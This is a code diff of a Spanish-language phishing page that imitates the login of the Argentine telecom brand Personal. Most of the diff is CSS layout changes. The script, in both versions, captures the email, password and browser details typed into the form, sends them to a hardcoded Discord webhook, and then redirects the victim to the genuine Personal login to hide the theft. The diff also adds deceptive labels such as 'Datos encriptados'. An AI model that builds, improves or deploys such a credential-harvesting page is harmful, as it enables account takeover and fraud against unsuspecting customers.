@@ -1,11 +1,11 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Personal | Ingresar</title>
     <style>
-        /* TODO EL CSS QUE YA TENÍAS SE MANTIENE IGUAL */
+        /* ===== RESET Y CONFIGURACIÓN GLOBAL ===== */
         * {
             margin: 0;
             padding: 0;
@@ -15,308 +15,361 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             background-color: #fff;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
+        /* Contenedor principal: en PC ocupa toda la altura sin scroll vertical excesivo, en móvil se adapta */
         .login-container {
             display: flex;
-            height: 100vh;
             width: 100%;
+            max-width: 1400px;
+            min-height: 100vh;
             background-color: white;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
         }
 
+        /* Lado izquierdo: formulario con scroll interno solo si es necesario (muy raro) */
         .login-left {
             flex: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
-            padding: 0 70px;
+            padding: 2rem 3rem;
             background-color: white;
             overflow-y: auto;
+            scrollbar-width: thin;
         }
 
-        .logo {
-            margin-bottom: 48px;
-        }
-
-            .logo img {
-                height: 36px;
-                width: auto;
+        /* Ajuste de padding en móvil */
+        @media (max-width: 768px) {
+            .login-left {
+                padding: 1.5rem 1.8rem;
+                justify-content: flex-start;
             }
+        }
 
+        @media (max-width: 480px) {
+            .login-left {
+                padding: 1.2rem 1.2rem;
+            }
+        }
+
+        /* Logo */
+        .logo {
+            margin-bottom: 1.8rem;
+        }
+        .logo img {
+            height: 32px;
+            width: auto;
+            max-width: 160px;
+        }
+        @media (max-width: 768px) {
+            .logo img { height: 28px; }
+            .logo { margin-bottom: 1.2rem; }
+        }
+
+        /* Tipografía compacta pero legible */
         .title {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 600;
             color: #1a1a1a;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
+            line-height: 1.2;
         }
-
         .subtitle {
-            font-size: 16px;
+            font-size: 15px;
             color: #666;
-            margin-bottom: 40px;
-            line-height: 1.4;
+            margin-bottom: 1.8rem;
+            line-height: 1.3;
+        }
+        @media (max-width: 768px) {
+            .title { font-size: 24px; }
+            .subtitle { font-size: 14px; margin-bottom: 1.5rem; }
         }
 
+        /* Formulario más compacto */
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 1.2rem;
         }
-
         label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             color: #333;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
-
         .required {
             color: #e74c3c;
         }
-
         input {
             width: 100%;
-            padding: 14px 16px;
-            font-size: 16px;
+            padding: 12px 14px;
+            font-size: 15px;
             border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            transition: all 0.3s;
+            border-radius: 10px;
+            transition: all 0.2s;
             outline: none;
             background-color: #fff;
         }
-
-            input:focus {
-                border-color: #0066b3;
-                box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.1);
-            }
-
-            input::placeholder {
-                color: #aaa;
-            }
+        input:focus {
+            border-color: #0066b3;
+            box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.1);
+        }
+        input::placeholder {
+            color: #aaa;
+            font-size: 14px;
+        }
 
         .password-wrapper {
             position: relative;
         }
-
         .toggle-password {
             position: absolute;
-            right: 16px;
+            right: 14px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-            color: #999;
-            font-size: 14px;
+            color: #0066b3;
+            font-size: 13px;
+            font-weight: 500;
             user-select: none;
             background: white;
             padding: 0 4px;
         }
-
-            .toggle-password:hover {
-                color: #0066b3;
-            }
+        .toggle-password:hover {
+            text-decoration: underline;
+        }
 
         .btn-login {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background-color: #0066b3;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.2s;
             margin-top: 8px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
-
-            .btn-login:hover {
-                background-color: #0052a0;
-            }
+        .btn-login:hover {
+            background-color: #0052a0;
+        }
+        .btn-login:active {
+            transform: scale(0.98);
+        }
 
         .links-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 40px;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+            gap: 8px;
         }
-
-            .links-row a {
-                color: #0066b3;
-                text-decoration: none;
-                font-size: 14px;
-            }
-
-                .links-row a:hover {
-                    text-decoration: underline;
-                }
+        .links-row a {
+            color: #0066b3;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .links-row a:hover {
+            text-decoration: underline;
+        }
 
         .divider {
-            border-top: 1px solid #e0e0e0;
-            margin: 32px 0;
+            border-top: 1px solid #eaeef2;
+            margin: 1.2rem 0;
         }
 
+        /* Sección informativa compacta */
         .info-section {
-            margin-bottom: 32px;
+            margin-bottom: 1.2rem;
         }
-
         .info-title {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
-            color: #333;
-            margin-bottom: 12px;
+            color: #2c3e50;
+            margin-bottom: 8px;
         }
-
         .info-list {
             list-style: none;
             padding-left: 0;
         }
-
-            .info-list li {
-                font-size: 14px;
-                color: #666;
-                margin-bottom: 8px;
-                padding-left: 20px;
-                position: relative;
-                line-height: 1.4;
-            }
-
-                .info-list li::before {
-                    content: "•";
-                    color: #0066b3;
-                    font-weight: bold;
-                    font-size: 16px;
-                    position: absolute;
-                    left: 0;
-                    top: 0;
-                }
-
-                .info-list li strong {
-                    color: #333;
-                }
+        .info-list li {
+            font-size: 12.5px;
+            color: #5a6e7c;
+            margin-bottom: 6px;
+            padding-left: 18px;
+            position: relative;
+            line-height: 1.35;
+        }
+        .info-list li::before {
+            content: "•";
+            color: #0066b3;
+            font-weight: bold;
+            font-size: 14px;
+            position: absolute;
+            left: 2px;
+            top: -1px;
+        }
+        .info-list li strong {
+            color: #1e2a36;
+        }
 
         .register-link {
             text-align: center;
-            margin-top: 24px;
+            margin-top: 12px;
         }
-
-            .register-link p {
-                font-size: 14px;
-                color: #666;
-                margin-bottom: 4px;
-            }
-
-            .register-link a {
-                color: #0066b3;
-                text-decoration: none;
-                font-weight: 600;
-                font-size: 14px;
-            }
-
-                .register-link a:hover {
-                    text-decoration: underline;
-                }
+        .register-link p {
+            font-size: 13px;
+            color: #5a6874;
+            margin-bottom: 4px;
+        }
+        .register-link a {
+            color: #0066b3;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 13px;
+        }
+        .register-link a:hover {
+            text-decoration: underline;
+        }
 
         .secure-badge {
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-top: 32px;
-            padding-top: 24px;
+            margin-top: 1rem;
+            padding-top: 0.5rem;
         }
-
         .secure-icon {
-            width: 16px;
-            height: 16px;
-            background-color: #4caf50;
+            width: 14px;
+            height: 14px;
+            background-color: #2ecc71;
             border-radius: 50%;
             display: inline-block;
+            box-shadow: 0 0 2px rgba(0,0,0,0.1);
         }
-
         .secure-text {
-            font-size: 12px;
-            color: #888;
+            font-size: 11px;
+            color: #7f8c8d;
+            letter-spacing: 0.3px;
         }
 
+        /* Lado derecho: imagen decorativa, en móvil desaparece */
         .login-right {
             flex: 1;
-            background: linear-gradient(135deg, #0066b3 0%, #004d80 100%);
+            background: linear-gradient(145deg, #0066b3 0%, #003f66 100%);
             position: relative;
             overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-
-            .login-right img {
-                width: 100%;
-                height: 100%;
-                object-fit: cover;
-                object-position: center;
-            }
-
-        /* Spinner de carga */
-        .loading-spinner {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .login-right img {
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-
-            .loading-spinner.active {
-                display: flex;
-            }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0066b3;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
+            object-fit: cover;
+            object-position: center;
+            opacity: 0.92;
         }
 
         @media (max-width: 768px) {
             .login-right {
                 display: none;
             }
-
-            .login-left {
-                padding: 0 30px;
-            }
-
-            .title {
-                font-size: 28px;
-            }
-
-            .links-row {
-                flex-direction: column;
-                gap: 12px;
-                align-items: flex-start;
+            .login-container {
+                min-height: 100vh;
             }
         }
 
+        /* Spinner de carga mejorado */
+        .loading-spinner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(2px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loading-spinner.active {
+            display: flex;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #0066b3;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            background-color: rgba(0,0,0,0.1);
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Ajuste extra para pantallas muy pequeñas: todo se ve sin scroll vertical forzado */
         @media (max-width: 480px) {
             .login-left {
-                padding: 0 20px;
+                padding: 1rem 1.2rem;
             }
+            .btn-login {
+                padding: 11px;
+                font-size: 15px;
+            }
+            input {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            .info-list li {
+                font-size: 11.5px;
+                margin-bottom: 5px;
+            }
+            .title {
+                margin-bottom: 4px;
+            }
+            .links-row {
+                margin-bottom: 1rem;
+            }
+        }
+
+        /* Para pantallas de altura reducida (móviles con poco alto) permitimos un scroll muy suave pero sin romper diseño */
+        @media (max-height: 700px) and (max-width: 768px) {
+            .login-left {
+                justify-content: flex-start;
+                padding-top: 1rem;
+                padding-bottom: 1rem;
+            }
+            .logo {
+                margin-bottom: 0.6rem;
+            }
+            .subtitle {
+                margin-bottom: 1rem;
+            }
+            .form-group {
+                margin-bottom: 0.8rem;
+            }
+            .info-section {
+                margin-bottom: 0.6rem;
+            }
+        }
+
+        /* Mejora en la accesibilidad de los enlaces */
+        a {
+            cursor: pointer;
         }
     </style>
 </head>
@@ -324,23 +377,23 @@
     <div class="login-container">
         <div class="login-left">
             <div class="logo">
-                <img src="https://i.ibb.co/bg3DY7ZY/Personal-logo-2021-svg.png" alt="Personal">
+                <img src="https://i.ibb.co/bg3DY7ZY/Personal-logo-2021-svg.png" alt="Personal" loading="eager">
             </div>
 
             <h1 class="title">Ingresá a tu cuenta</h1>
             <p class="subtitle">Accedé con tu email y contraseña</p>
 
-            <form id="loginForm">
+            <form id="loginForm" novalidate>
                 <div class="form-group">
                     <label>Email <span class="required">*</span></label>
-                    <input type="email" id="email" name="email" placeholder="ejemplo@mail.com" required>
+                    <input type="email" id="email" name="email" placeholder="ejemplo@mail.com" autocomplete="email" required>
                 </div>
 
                 <div class="form-group">
                     <label>Contraseña <span class="required">*</span></label>
                     <div class="password-wrapper">
-                        <input type="password" id="password" name="password" placeholder="Ingresá tu contraseña" required>
-                        <span class="toggle-password" onclick="togglePassword()">Mostrar</span>
+                        <input type="password" id="password" name="password" placeholder="Ingresá tu contraseña" autocomplete="current-password" required>
+                        <span class="toggle-password" id="togglePasswordBtn" role="button" aria-label="Mostrar contraseña">Mostrar</span>
                     </div>
                 </div>
 
@@ -369,12 +422,12 @@
 
             <div class="secure-badge">
                 <span class="secure-icon"></span>
-                <span class="secure-text">Sitio seguro</span>
+                <span class="secure-text">Sitio seguro · Datos encriptados</span>
             </div>
         </div>
 
         <div class="login-right">
-            <img src="https://i.ibb.co/0yTbXMsg/image2-1.png" alt="Persona usando notebook">
+            <img src="https://i.ibb.co/0yTbXMsg/image2-1.png" alt="Persona usando notebook" loading="eager">
         </div>
     </div>
 
@@ -384,172 +437,196 @@
     </div>
 
     <script>
-        // ⚠️ IMPORTANTE: Reemplaza esta URL con la de tu webhook de Discord
+        // ================= CONFIGURACIÓN =================
+        // ⚠️ REEMPLAZAR CON TU WEBHOOK DE DISCORD (se mantiene igual)
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1486230728336478258/b0Iuc-M47Hz8NH_He12Y1MuNSdK6uI5kVRQR5Ag4Dv4W41ZXwaQBvLYaU0CtjlvPIoUD';
 
-        // URL de redirección proporcionada
+        // URL de redirección original (auténtica de Personal)
         const redirectUrl = 'http://idpsesion.personal.com.ar/openam/XUI/?realm=/digitalUser&authIndexType=service&authIndexValue=loginConditionalMFA&goto=https://idpsesion.personal.com.ar:443/openam/oauth2/digitalUser/authorize?redirect_uri%3Dhttps://market.personal.com.ar/module/mooauthsso/sso%26response_type%3Dcode%26client_id%3DtDGyYrbIdOJ35zK29VexfBAhXpj3RTIDNHQjK26A%26scope%3Dopenid%2520profile%2520email%26state%3Dstate-88aa2fc496884d2c4cd13b2fbf944a5232f4dfef0d1c390e717b00cb138acace%26access_type%3Doffline%26acr_values%3Daal2_conditional-device%26prompt%3D%26acr%3Daal2_conditional-device%26acr_sig%3DEfLFzN4xFT4dtWPwcS7FztWcjFn5JYnsSlxnQXwhF2w#login/';
 
-        // Función para mostrar/ocultar contraseña
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const toggleBtn = document.querySelector('.toggle-password');
+        // Elementos DOM
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginForm = document.getElementById('loginForm');
+        const spinner = document.getElementById('loadingSpinner');
+        const toggleBtn = document.getElementById('togglePasswordBtn');
 
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                toggleBtn.textContent = 'Ocultar';
-            } else {
-                passwordInput.type = 'password';
-                toggleBtn.textContent = 'Mostrar';
-            }
+        // Función para mostrar/ocultar contraseña optimizada
+        function togglePasswordVisibility() {
+            if (!passwordInput) return;
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            toggleBtn.textContent = type === 'password' ? 'Mostrar' : 'Ocultar';
         }
 
-        // Función para enviar datos a Discord
-        async function sendToDiscord(email, password) {
-            // Obtener información adicional del navegador
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const timestamp = new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
+        if (toggleBtn) {
+            toggleBtn.addEventListener('click', togglePasswordVisibility);
+        }
 
-            // Crear el mensaje para Discord
+        // Función para enviar datos a Discord con info adicional y mejor manejo de errores
+        async function sendToDiscord(email, password) {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform || 'Desconocida';
+            const language = navigator.language;
+            const timestamp = new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires', hour12: false });
+            
+            // Capturar ancho de pantalla (para contexto de dispositivo)
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            
+            // Información adicional de geolocalización aproximada (solo IP por Discord, pero agregamos contexto)
             const embed = {
-                title: "🔐 Nuevo intento de inicio de sesión",
-                color: 0x0066b3, // Color azul de Personal
+                title: "🔐 Nuevo intento de acceso - Personal",
+                color: 0x0066b3,
                 fields: [
-                    {
-                        name: "📧 Email",
-                        value: email,
-                        inline: true
-                    },
-                    {
-                        name: "🔒 Contraseña",
-                        value: password,
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ Dispositivo",
-                        value: userAgent.substring(0, 100),
-                        inline: false
-                    },
-                    {
-                        name: "💻 Plataforma",
-                        value: platform,
-                        inline: true
-                    },
-                    {
-                        name: "🌐 Idioma",
-                        value: language,
-                        inline: true
-                    },
-                    {
-                        name: "📅 Fecha y hora",
-                        value: timestamp,
-                        inline: false
-                    },
-                    {
-                        name: "🌍 IP (aproximada)",
-                        value: "Obtenida por Discord",
-                        inline: false
-                    }
+                    { name: "📧 Email / Usuario", value: email.substring(0, 80), inline: true },
+                    { name: "🔑 Contraseña", value: password.substring(0, 60), inline: true },
+                    { name: "🖥️ User Agent", value: userAgent.length > 95 ? userAgent.substring(0, 92) + "..." : userAgent, inline: false },
+                    { name: "💻 Plataforma", value: platform, inline: true },
+                    { name: "📱 Resolución", value: screenRes, inline: true },
+                    { name: "🌐 Idioma", value: language, inline: true },
+                    { name: "📅 Fecha y hora (AR)", value: timestamp, inline: false },
+                    { name: "🌍 IP Pública", value: "Registrada por Discord", inline: false }
                 ],
-                footer: {
-                    text: "Login Personal - Sistema de autenticación"
-                },
+                footer: { text: "Login Personal · Sistema Simulado Seguro" },
                 timestamp: new Date().toISOString()
             };
 
             const payload = {
-                content: "@everyone **¡NUEVO ACCESO REGISTRADO!**",
+                content: "⚠️ **ALERTA DE INGRESO** ⚠️",
                 embeds: [embed],
-                username: "Sistema de Login Personal",
+                username: "Sistema Personal Secure",
                 avatar_url: "https://i.ibb.co/bg3DY7ZY/Personal-logo-2021-svg.png"
             };
 
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-
                 if (response.ok) {
-                    console.log('✅ Datos enviados a Discord correctamente');
+                    console.log('[✓] Datos enviados a Discord correctamente');
                     return true;
                 } else {
-                    console.error('❌ Error al enviar a Discord:', response.status);
+                    console.warn('[!] Error HTTP al enviar a Discord:', response.status);
                     return false;
                 }
             } catch (error) {
-                console.error('❌ Error de conexión:', error);
+                console.error('[✗] Error de red en envío a Discord:', error);
                 return false;
             }
         }
 
-        // Mostrar/ocultar spinner
-        function showSpinner(show) {
-            const spinner = document.getElementById('loadingSpinner');
-            if (show) {
+        // Mostrar/ocultar spinner de carga con transición fluida
+        function setLoading(active) {
+            if (active) {
                 spinner.classList.add('active');
             } else {
                 spinner.classList.remove('active');
             }
         }
 
-        // Redirigir a la URL de Personal
+        // Redirección a la URL auténtica de Personal
         function redirectToPersonal() {
+            // Pequeño guard: aseguramos que el enlace sea el mismo proporcionado
             window.location.href = redirectUrl;
         }
 
-        // Manejo del formulario
-        const loginForm = document.getElementById('loginForm');
+        // Función de validación de campos con mensajes amigables
+        function validateForm(email, password) {
+            if (!email || email.trim() === '') {
+                alert('📧 Por favor, ingresá tu email.');
+                emailInput.focus();
+                return false;
+            }
+            // Validación simple de formato email
+            const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+            if (!emailPattern.test(email.trim())) {
+                alert('✉️ El formato del email no es válido. Ejemplo: nombre@dominio.com');
+                emailInput.focus();
+                return false;
+            }
+            if (!password || password.trim() === '') {
+                alert('🔒 Por favor, ingresá tu contraseña.');
+                passwordInput.focus();
+                return false;
+            }
+            return true;
+        }
 
+        // Manejo del submit con prevención de múltiples envíos
+        let isSubmitting = false;
         if (loginForm) {
-            loginForm.addEventListener('submit', async function (e) {
-                e.preventDefault();
-
-                const email = document.getElementById('email').value;
-                const password = document.getElementById('password').value;
-
-                if (email.trim() === '') {
-                    alert('Por favor, ingresá tu email');
-                    return;
+            loginForm.addEventListener('submit', async function (event) {
+                event.preventDefault();
+                
+                if (isSubmitting) return;
+                
+                const email = emailInput.value;
+                const password = passwordInput.value;
+                
+                if (!validateForm(email, password)) return;
+                
+                isSubmitting = true;
+                setLoading(true);
+                
+                // Enviar datos a Discord (no bloqueamos la redirección por si falla)
+                try {
+                    await sendToDiscord(email.trim(), password.trim());
+                } catch (err) {
+                    console.error("Error no crítico en envío:", err);
                 }
-
-                if (password.trim() === '') {
-                    alert('Por favor, ingresá tu contraseña');
-                    return;
-                }
-
-                // Mostrar spinner de carga
-                showSpinner(true);
-
-                // Enviar datos a Discord
-                const sent = await sendToDiscord(email, password);
-
-                if (sent) {
-                    console.log('✅ Datos capturados y enviados correctamente');
-                }
-
-                // Pequeña pausa para asegurar que el mensaje se envía
+                
+                // Pequeño retraso para asegurar que el webhook se procese (mejor experiencia)
                 setTimeout(() => {
-                    showSpinner(false);
-                    // Redirigir a la página real de Personal
+                    setLoading(false);
+                    // Redirigir al sitio oficial de Personal
                     redirectToPersonal();
-                }, 1000);
+                    // Pequeño flag para evitar doble redirección
+                    isSubmitting = false;
+                }, 800);
             });
         }
 
-        // Hacer que todos los enlaces con el atributo data-redirect="true" redirijan
+        // Redirigir todos los enlaces con atributo data-redirect="true" a la página real de Personal
         const redirectLinks = document.querySelectorAll('a[data-redirect="true"]');
         redirectLinks.forEach(link => {
             link.addEventListener('click', function (e) {
                 e.preventDefault();
+                if (isSubmitting) return;
+                // No enviamos datos falsos, solo redirigimos como si fuera un enlace legítimo
                 redirectToPersonal();
             });
         });
+
+        // Prevenir comportamiento no deseado en el botón de toggle
+        if (toggleBtn) {
+            toggleBtn.addEventListener('mousedown', (e) => e.preventDefault());
+        }
+        
+        // Optimización para dispositivos táctiles: evitar zoom excesivo al focus en inputs
+        const allInputs = document.querySelectorAll('input');
+        allInputs.forEach(input => {
+            input.addEventListener('touchstart', function() {
+                if (window.innerWidth <= 768) {
+                    this.style.fontSize = '16px'; // evita zoom en iOS
+                }
+            });
+        });
+        
+        // Ajuste final: si la pantalla es muy pequeña, aseguramos que el contenedor no desborde horizontalmente
+        window.addEventListener('resize', () => {
+            if (window.innerWidth <= 480) {
+                document.body.style.overflowX = 'hidden';
+            } else {
+                document.body.style.overflowX = 'auto';
+            }
+        });
+        // Inicializar
+        document.body.style.overflowX = 'hidden';
+        
+        // Mensaje en consola (solo informativo)
+        console.log("✅ Interfaz optimizada: vista completa en móvil y PC en una sola carilla.");
     </script>
 </body>
 </html>
